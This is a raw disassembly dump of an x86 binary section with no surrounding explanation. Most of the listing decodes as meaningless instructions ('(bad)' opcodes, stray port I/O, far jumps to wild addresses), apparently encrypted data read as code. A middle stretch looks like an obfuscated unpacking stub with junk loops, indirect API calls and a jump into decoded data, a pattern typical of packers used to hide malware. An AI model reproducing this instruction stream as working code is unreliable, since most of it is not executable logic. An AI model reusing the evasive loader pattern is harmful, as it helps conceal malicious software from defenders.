  413182:	stos   DWORD PTR es:[edi],eax
  413183:	sub    al,al
  413185:	cli    
  413186:	imul   eax,esi,0x179f052d
  41318c:	lods   al,BYTE PTR ds:[esi]
  41318d:	(bad)  
  41318e:	std    
  41318f:	jecxz  0x4131bb
  413191:	in     eax,0xba
  413193:	in     al,0xf0
  413195:	mov    dl,BYTE PTR [ebx]
  413197:	adc    BYTE PTR [eax-0x3e4ad07f],ah
  41319d:	cmp    dl,bl
  41319f:	pop    ds
  4131a0:	mov    bh,BYTE PTR [ecx]
  4131a2:	push   cs
  4131a3:	mov    edx,0xfcd257b9
  4131a8:	add    esp,esi
  4131aa:	add    edi,DWORD PTR [eax-0x51]
  4131ad:	hlt    
  4131ae:	scas   eax,DWORD PTR es:[edi]
  4131af:	dec    eax
  4131b0:	inc    ecx
  4131b1:	mov    ds:0xda0abb8,al
  4131b6:	or     al,0xbd
  4131b8:	or     al,0x5
  4131ba:	daa    
  4131bb:	fsub   DWORD PTR [esi]
  4131bd:	cmp    bl,BYTE PTR [ebp-0x6d]
  4131c0:	clc    
  4131c1:	xor    eax,0x59f3fca2
  4131c6:	xor    BYTE PTR [ebp-0x3d],cl
  4131c9:	or     esi,DWORD PTR [ecx+0x33]
  4131cc:	and    DWORD PTR [esi+esi*1-0xb54058c],edx
  4131d3:	in     al,0xcd
  4131d5:	cmovle edi,eax
  4131d8:	(bad)  
  4131da:	std    
  4131db:	jb     0x4131b8
  4131dd:	push   edx
  4131de:	fcomip st,st(4)
  4131e0:	repz or DWORD PTR [ecx],edi
  4131e3:	sub    edi,edi
  4131e5:	js     0x413175
  4131e7:	xlat   BYTE PTR ds:[ebx]
  4131e8:	sbb    BYTE PTR gs:[edx+0x1b],bl
  4131ec:	retf   
  4131ed:	xchg   edi,eax
  4131ee:	repz sub al,0x95
  4131f1:	(bad)  
  4131f2:	adc    dh,BYTE PTR [edx+esi*8]
  4131f5:	mov    al,0xb6
  4131f7:	adc    ebp,DWORD PTR [eax+0x3f]
  4131fa:	call   0x51e47d
  4131ff:	adc    eax,0xdb36fe05
  413204:	(bad)  [ebx]
  413206:	add    DWORD PTR [esi+eiz*2],0xffffffea
  41320a:	iret   
  41320b:	popa   
  41320c:	fisttp QWORD PTR [eax+0x5cc46f15]
  413212:	rol    ebp,0xc2
  413215:	neg    DWORD PTR [edx-0x3f42803a]
  41321b:	gs or  al,0xf6
  41321e:	call   0xb5ae0cb3
  413223:	in     al,0x64
  413225:	sbb    ecx,DWORD PTR [ebx-0x13]
  413228:	sbb    ah,al
  41322a:	cmp    al,0x8e
  41322c:	ror    eax,0x58
  41322f:	stos   DWORD PTR es:[edi],eax
  413230:	inc    ecx
  413231:	lds    ebp,FWORD PTR [ebp+0x493a112b]
  413237:	(bad)  
  413238:	lock mov eax,gs
  41323b:	retf   
  41323c:	pushf  
  41323d:	add    DWORD PTR [eax-0x22],ebx
  413240:	pop    edx
  413241:	add    esp,DWORD PTR [edx]
  413243:	mov    eax,0xfdb67461
  413248:	xchg   edi,eax
  413249:	js     0x4131f1
  41324b:	sbb    DWORD PTR [esi],esi
  41324d:	retf   0x9a0c
  413250:	(bad)  
  413253:	pusha  
  413254:	fnstsw WORD PTR ds:0xb42f7949
  41325a:	les    edi,FWORD PTR [esi-0x61c9fa0d]
  413260:	pushf  
  413261:	imul   ebx,DWORD PTR [ebx],0xffffff91
  413264:	and    BYTE PTR [edx],cl
  413266:	jae    0x413266
  413268:	cmp    esp,DWORD PTR [ecx-0xb81f2eb]
  41326e:	cmp    al,0x7
  413270:	sub    eax,0x5ba3ac4a
  413275:	xchg   ebp,eax
  413276:	cmp    BYTE PTR [edi],bl
  413278:	outs   dx,DWORD PTR ds:[esi]
  413279:	mov    ecx,0xbb86db18
  41327e:	pop    ss
  41327f:	push   ebx
  413280:	push   0xffffff9a
  413282:	push   cs
  413283:	arpl   WORD PTR [eax],dx
  413285:	xor    BYTE PTR ds:0xc735d1db,bh
  41328b:	aaa    
  41328c:	lock mul eax
  41328f:	pop    edx
  413290:	mov    cl,0xba
  413292:	imul   ebx,esi,0xb257ebd1
  413298:	push   cs
  413299:	cmc    
  41329a:	inc    ecx
  41329b:	cmp    dl,bl
  41329d:	mov    ebx,DWORD PTR [esi-0x25]
  4132a0:	mov    bl,0x91
  4132a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132a3:	(bad)  
  4132a4:	pusha  
  4132a5:	and    eax,0xd7561077
  4132aa:	in     eax,dx
  4132ab:	cmp    eax,0xb85e6b97
  4132b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132b1:	adc    edx,DWORD PTR [edi]
  4132b3:	xchg   ebp,eax
  4132b4:	push   ebp
  4132b5:	push   edx
  4132b6:	outs   dx,DWORD PTR ds:[esi]
  4132b7:	mov    ebx,0xbcf8dad2
  4132bc:	inc    ebp
  4132bd:	inc    esi
  4132be:	daa    
  4132bf:	daa    
  4132c0:	inc    eax
  4132c1:	std    
  4132c2:	inc    ebp
  4132c3:	jns    0x41326b
  4132c5:	scas   al,BYTE PTR es:[edi]
  4132c6:	into   
  4132c7:	ficomp WORD PTR [edi]
  4132c9:	jne    0x4132c0
  4132cb:	int    0xc9
  4132cd:	aam    0x20
  4132cf:	in     eax,dx
  4132d0:	or     DWORD PTR [eax+0x47],esp
  4132d3:	lahf   
  4132d4:	(bad)  
  4132d5:	cmp    al,0x0
  4132d7:	or     BYTE PTR [ebp+edi*8+0x1e322bbd],cl
  4132de:	popa   
  4132df:	xor    al,0x43
  4132e1:	cs jbe 0x413282
  4132e4:	inc    ebx
  4132e5:	and    al,0x5a
  4132e7:	push   edx
  4132e8:	(bad)  
  4132e9:	dec    ebp
  4132ea:	xor    al,0xfc
  4132ec:	dec    edi
  4132ed:	leave  
  4132ee:	iret   
  4132ef:	xchg   edx,eax
  4132f0:	jmp    0x17ea:0xc66ebc83
  4132f7:	in     eax,0x49
  4132f9:	inc    ebx
  4132fa:	js     0x413373
  4132fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132fd:	sbb    al,0xbc
  4132ff:	iret   
  413300:	dec    ebp
  413301:	dec    edi
  413302:	mov    esp,0x2e3dceb8
  413307:	hlt    
  413308:	xor    ecx,DWORD PTR [edi+edi*8-0x5a]
  41330c:	xchg   edi,eax
  41330d:	pop    esp
  41330e:	imul   edi,DWORD PTR [eax],0x68
  413311:	cmp    DWORD PTR [edx-0x66],ebp
  413314:	mov    dl,0x1e
  413316:	mov    bh,0x7f
  413318:	jns    0x413329
  41331a:	lods   eax,DWORD PTR ds:[esi]
  41331b:	ins    DWORD PTR es:[edi],dx
  41331c:	loopne 0x41336f
  41331e:	es jmp 0x355e713
  413324:	int3   
  413325:	icebp  
  413326:	fnstsw WORD PTR [eax]
  413328:	xbegin 0xc51318b5
  41332e:	mov    DWORD PTR [ebp+0x39],esi
  413331:	pop    ecx
  413332:	add    DWORD PTR [edi-0x1274766a],ecx
  413338:	inc    ebp
  413339:	push   edi
  41333a:	adc    al,0x3e
  41333c:	mov    cl,BYTE PTR [ecx-0x71fa38f6]
  413342:	push   cs
  413343:	inc    edx
  413344:	add    BYTE PTR [esi],dl
  413346:	add    BYTE PTR [eax],al
  413348:	add    BYTE PTR [ebx+0x420e8e3d],al
  41334e:	add    BYTE PTR [eax],al
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	sub    BYTE PTR ds:0x73be91be,0x7a
  41370c:	jp     0x413718
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	mov    dl,0xa2
  413713:	and    bh,BYTE PTR [edx-0x6a82888b]
  413719:	sbb    bl,al
  41371b:	jmp    0x41371d
  41371d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41371e:	out    0x5e,al
  413720:	ins    BYTE PTR es:[edi],dx
  413721:	test   BYTE PTR [ecx-0x6d],bl
  413724:	nop
  413725:	pop    ecx
  413726:	mov    ecx,0x8b310488
  41372b:	repz mov ecx,DWORD PTR [ecx]
  41372e:	int    0x85
  413730:	or     dl,BYTE PTR [esi-0x6be3eb3c]
  413736:	das    
  413737:	(bad)  
  413738:	xor    edx,DWORD PTR [ebp-0x7e]
  41373b:	dec    esi
  41373c:	aam    0xe0
  41373e:	cld    
  41373f:	inc    eax
  413740:	into   
  413741:	xchg   edi,eax
  413742:	aad    0x5f
  413744:	in     al,0x2b
  413746:	and    DWORD PTR [edx],edx
  413748:	popa   
  413749:	mov    bl,BYTE PTR [ecx+0xdd8df0a]
  41374f:	add    ecx,ecx
  413751:	dec    ebx
  413752:	or     al,BYTE PTR [esi+0x949ef0a]
  413758:	add    eax,0xc9c0cc1e
  41375d:	push   es
  41375e:	gs jnp 0x4137ab
  413761:	test   esi,ebp
  413763:	jno    0x41378c
  413765:	call   0x3c1af74f
  41376a:	or     bh,ah
  41376c:	adc    si,bp
  41376f:	or     eax,0xac254954
  413774:	sbb    BYTE PTR [edx-0x24ffa10c],dl
  41377a:	scas   eax,DWORD PTR es:[edi]
  41377b:	cmp    eax,0x7508c296
  413780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413781:	cmp    edi,DWORD PTR [eax-0x69a7cd3c]
  413787:	dec    eax
  413788:	cs pop es
  41378a:	out    0x1e,al
  41378c:	enter  0x53fb,0xcc
  413790:	popf   
  413791:	retf   0x7088
  413794:	retf   0xe441
  413797:	iret   
  413798:	dec    ebp
  413799:	cwde   
  41379a:	pushf  
  41379b:	or     BYTE PTR [esi+edx*2-0x72],ah
  41379f:	in     al,dx
  4137a0:	push   edi
  4137a1:	add    ah,BYTE PTR ds:0xa2027ad9
  4137a7:	leave  
  4137a8:	lods   al,BYTE PTR ds:[esi]
  4137a9:	and    al,0xda
  4137ab:	sub    esp,DWORD PTR [esi]
  4137ad:	out    dx,eax
  4137ae:	add    ch,BYTE PTR [ebx+0x2fe0f538]
  4137b4:	ret    
  4137b5:	jmp    0xbb68405
  4137ba:	sbb    al,0xba
  4137bc:	ror    ch,1
  4137be:	(bad)  
  4137bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c0:	jo     0x4137f4
  4137c2:	ins    DWORD PTR es:[edi],dx
  4137c3:	rcl    edi,1
  4137c5:	or     al,0xe1
  4137c7:	cs cwd 
  4137ca:	xchg   DWORD PTR [esi-0xe],esp
  4137cd:	clc    
  4137ce:	xor    ah,BYTE PTR [eax]
  4137d0:	cmp    BYTE PTR [ebp-0x57],ah
  4137d3:	mov    cl,0x53
  4137d5:	repnz stos DWORD PTR es:[edi],eax
  4137d7:	pop    ecx
  4137d8:	mov    al,0x30
  4137da:	neg    DWORD PTR [ebp-0x5de0f36f]
  4137e0:	(bad)  
  4137e2:	and    ch,bh
  4137e4:	data16 jbe 0x4137e8
  4137e7:	cmp    eax,0xf900c4fd
  4137ec:	add    ch,ch
  4137ee:	mov    dl,0xbd
  4137f0:	xor    edx,edi
  4137f2:	jl     0x4137bb
  4137f4:	push   edi
  4137f5:	ret    0x541c
  4137f8:	jecxz  0x413870
  4137fa:	mov    DWORD PTR [edi],0x58741fb2
  413800:	fwait
  413801:	xor    al,0x50
  413803:	xchg   edi,eax
  413804:	rcl    ecx,1
  413806:	sbb    DWORD PTR [eax-0x1ec9d830],ecx
  41380c:	pop    edi
  41380d:	sahf   
  41380e:	and    BYTE PTR [esi-0x1d5c8dd6],al
  413814:	add    ah,BYTE PTR [ebx-0x3b]
  413817:	aad    0x32
  413819:	test   esi,ebp
  41381b:	xlat   BYTE PTR ds:[ebx]
  41381c:	loopne 0x4137a9
  41381e:	movups xmm7,xmm0
  413821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413822:	and    DWORD PTR [edi-0x5],ebp
  413825:	test   DWORD PTR [ecx+0x31a1e2c2],edi
  41382b:	cmp    al,0xff
  41382d:	inc    edi
  41382e:	mov    ch,0xd5
  413830:	cdq    
  413831:	aas    
  413832:	or     edx,DWORD PTR [edx+0x7245e0b8]
  413838:	or     ebx,DWORD PTR [ecx]
  41383a:	adc    al,0x52
  41383c:	push   ds
  41383d:	and    al,0x51
  41383f:	imul   ebp,DWORD PTR [edx+0x723cea54],0xb6a40cfa
  413849:	lds    esp,FWORD PTR [eax]
  41384b:	inc    esp
  41384c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41384d:	or     BYTE PTR [ebx-0x37],dh
  413850:	xchg   BYTE PTR fs:[ecx+0x6d],al
  413854:	ja     0x41387b
  413856:	xchg   esi,eax
  413857:	jge    0x413834
  413859:	and    eax,0x482859fe
  41385e:	shr    BYTE PTR [esi-0x4a0e9c63],1
  413864:	mov    edx,0x9f731ba0
  413869:	cmp    dl,BYTE PTR [ecx]
  41386b:	mov    bl,0x69
  41386d:	push   ds
  41386e:	std    
  41386f:	les    ebx,FWORD PTR [ebp+0x1457408]
  413875:	xchg   esp,eax
  413876:	into   
  413877:	popa   
  413878:	push   0x6a
  41387a:	pop    ecx
  41387b:	iret   
  41387c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41387d:	cld    
  41387e:	add    edi,DWORD PTR [edx-0x4c22f7db]
  413884:	mov    dl,0xc9
  413886:	sar    BYTE PTR [esi-0x99eb26d],0x94
  41388d:	mov    esi,eax
  41388f:	or     esi,ebx
  413891:	repnz xor DWORD PTR [esp+edx*2-0xf6ad1fe],esp
  413899:	jl     0x41386a
  41389b:	adc    BYTE PTR [ebx-0x15bbda0d],ah
  4138a1:	(bad)  
  4138a2:	fadd   QWORD PTR [edi]
  4138a4:	jne    0x413850
  4138a6:	push   esi
  4138a7:	inc    esp
  4138a8:	(bad)  
  4138a9:	dec    esi
  4138aa:	stos   DWORD PTR es:[edi],eax
  4138ab:	xor    ecx,DWORD PTR [ecx+ebx*1-0xd]
  4138af:	pop    ss
  4138b0:	in     eax,0x5e
  4138b2:	sub    al,0xd6
  4138b4:	jmp    0x3310:0xeb4ccdec
  4138bb:	xor    dl,BYTE PTR [edx]
  4138bd:	xor    BYTE PTR [edx-0x3d],bl
  4138c0:	sub    ecx,DWORD PTR [ecx-0x7915ebd0]
  4138c6:	cmp    esp,DWORD PTR [edi+0x46c7b77a]
  4138cc:	dec    ebx
  4138cd:	imul   edi,ebp,0xffffffae
  4138d0:	dec    eax
  4138d1:	sbb    bh,BYTE PTR [ecx]
  4138d3:	mov    al,ds:0xa690b9c1
  4138d8:	mov    DWORD PTR [esi+ebp*8],ebx
  4138db:	fild   QWORD PTR [ebp+0x48]
  4138de:	call   0x12fc:0x1ee1774a
  4138e5:	aas    
  4138e6:	sbb    DWORD PTR [edx-0x29],0x9ad82253
  4138ed:	(bad)  
  4138ee:	je     0x4138b9
  4138f0:	sar    DWORD PTR [ebp+0x2e],cl
  4138f3:	les    eax,FWORD PTR [esi-0x6f]
  4138f6:	fistp  WORD PTR [ecx+0x48]
  4138f9:	and    al,0xc2
  4138fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138fc:	or     eax,0x22025040
  413901:	jbe    0x4138ce
  413903:	faddp  st(2),st
  413905:	test   al,0x8a
  413907:	jg     0x4138bb
  413909:	lods   eax,DWORD PTR ds:[esi]
  41390a:	dec    esi
  41390b:	ss mov esp,0x938f107
  413911:	xor    eax,0xd046a457
  413916:	mov    ds:0x936a11c1,al
  41391b:	xor    eax,DWORD PTR [ecx]
  41391d:	repz mov ebx,0x26be862f
  413923:	sahf   
  413924:	int3   
  413925:	outs   dx,BYTE PTR ds:[esi]
  413926:	jbe    0x413917
  413928:	pop    ebp
  413929:	cs dec ebp
  41392b:	cmp    ebp,0xfea81675
  413931:	ret    0xce55
  413934:	(bad)  
  413935:	jmp    0x4139b6
  413937:	mov    esp,DWORD PTR [ecx+ecx*2+0x39]
  41393b:	push   0xc
  41393d:	dec    edi
  41393e:	imul   esi,DWORD PTR [edx],0x407fdd47
  413944:	jmp    0x4138e2
  413946:	cli    
  413947:	repnz pop esp
  413949:	pop    esp
  41394a:	mov    al,0x57
  41394c:	mov    dl,0x95
  41394e:	jmp    FWORD PTR [esi-0x159df64a]
  413954:	adc    ah,BYTE PTR [eax]
  413956:	outs   dx,DWORD PTR ds:[esi]
  413957:	ss (bad) 
  413959:	(bad)  
  41395a:	stos   BYTE PTR es:[edi],al
  41395b:	adc    DWORD PTR [edx+eiz*2],ebx
  41395e:	lods   al,BYTE PTR ds:[esi]
  41395f:	(bad)  
  413960:	fadd   st,st(2)
  413962:	popf   
  413963:	push   ecx
  413964:	loop   0x41398f
  413966:	adc    al,ch
  413968:	cmc    
  413969:	mov    esp,0xbf922039
  41396e:	cmp    cl,ch
  413970:	xor    eax,0x892c386
  413975:	in     al,dx
  413976:	aaa    
  413977:	jg     0x4139b1
  413979:	imul   ecx,DWORD PTR [ecx+eax*4+0x4a],0x57b9dc7f
  413981:	in     al,0x5b
  413983:	out    dx,al
  413984:	lods   al,BYTE PTR ds:[esi]
  413985:	js     0x4139c1
  413987:	(bad)  
  413988:	xchg   edi,eax
  413989:	leave  
  41398a:	dec    ebp
  41398b:	fs retf 0xd67b
  41398f:	adc    dl,al
  413991:	sub    al,0x71
  413993:	gs dec edx
  413995:	lock jp 0x4139aa
  413998:	jmp    0x413999
  41399a:	and    ah,bl
  41399c:	lods   eax,DWORD PTR ds:[esi]
  41399d:	rcr    BYTE PTR [ecx+0x4e710ccd],0x9f
  4139a4:	sub    BYTE PTR [eax-0x45],ah
  4139a7:	xlat   BYTE PTR ds:[ebx]
  4139a8:	jns    0x4139a3
  4139aa:	push   ebx
  4139ab:	leave  
  4139ac:	fld    st(6)
  4139ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139af:	pop    ebx
  4139b0:	add    edi,DWORD PTR [ecx-0x79d04ccf]
  4139b6:	mov    ebp,0x99bee98d
  4139bb:	or     ecx,ecx
  4139bd:	mov    ebp,0x8b85b468
  4139c2:	push   0x46
  4139c4:	mov    eax,0x75cd0806
  4139c9:	mov    eax,0x50bda2e5
  4139ce:	in     al,0x52
  4139d0:	adc    ah,bh
  4139d2:	sti    
  4139d3:	rol    BYTE PTR [eax+0x470b2a9b],0x94
  4139da:	mov    WORD PTR [ecx+0x2997955e],gs
  4139e0:	cli    
  4139e1:	(bad)  
  4139e2:	xor    dh,BYTE PTR [edx-0xa]
  4139e5:	adc    DWORD PTR [edi-0x24],0x234e778a
  4139ec:	rcl    bh,0xcd
  4139ef:	into   
  4139f0:	das    
  4139f1:	test   eax,0x8bfa9fee
  4139f6:	jnp    0x413a2c
  4139f8:	(bad)  
  4139f9:	dec    esp
  4139fa:	dec    ebx
  4139fb:	inc    ebx
  4139fc:	adc    eax,0xfb4b81e9
  413a01:	(bad)  [ecx-0x1b3bc5a6]
  413a07:	dec    ecx
  413a08:	gs jno 0x413a72
  413a0b:	cmp    DWORD PTR [esi+ebx*2-0x7d17e96f],0x41
  413a13:	fisub  DWORD PTR [eax-0x5063c057]
  413a19:	mov    ah,0xc2
  413a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a1c:	call   0xcd7b5c38
  413a21:	fiadd  WORD PTR [ebx-0x80717a0]
  413a27:	(bad)  
  413a28:	push   ebx
  413a29:	imul   eax,edi,0x68
  413a2c:	shl    BYTE PTR [bx+0xa],0x4f
  413a31:	pop    DWORD PTR [eax+0x32]
  413a34:	push   0xffffffc3
  413a36:	bound  esi,QWORD PTR [eax+eiz*2-0x14]
  413a3a:	pop    ecx
  413a3b:	aaa    
  413a3c:	std    
  413a3d:	mov    ah,0x26
  413a3f:	data16 (bad) 
  413a43:	and    dl,BYTE PTR ds:0x1e2bb028
  413a49:	push   cs
  413a4a:	fisttp QWORD PTR [edi]
  413a4c:	rcr    BYTE PTR [edi+0x5ded1f6d],1
  413a52:	pusha  
  413a53:	outs   dx,BYTE PTR ds:[esi]
  413a54:	add    al,BYTE PTR [ebx]
  413a56:	fsubr  QWORD PTR [esi+0x6b]
  413a59:	jo     0x413a00
  413a5b:	fadd   QWORD PTR [ecx-0x4f493ef6]
  413a61:	stos   BYTE PTR es:[edi],al
  413a62:	arpl   WORD PTR [ebx+0x7],si
  413a65:	ror    BYTE PTR [edi],1
  413a67:	add    ebp,DWORD PTR [edi-0xa]
  413a6a:	mov    ebx,0x2cc86d56
  413a6f:	in     eax,dx
  413a70:	cmc    
  413a71:	loop   0x413a36
  413a73:	jp     0x4139ff
  413a75:	(bad)  
  413a76:	or     al,0x58
  413a78:	jmp    0x30e88bf8
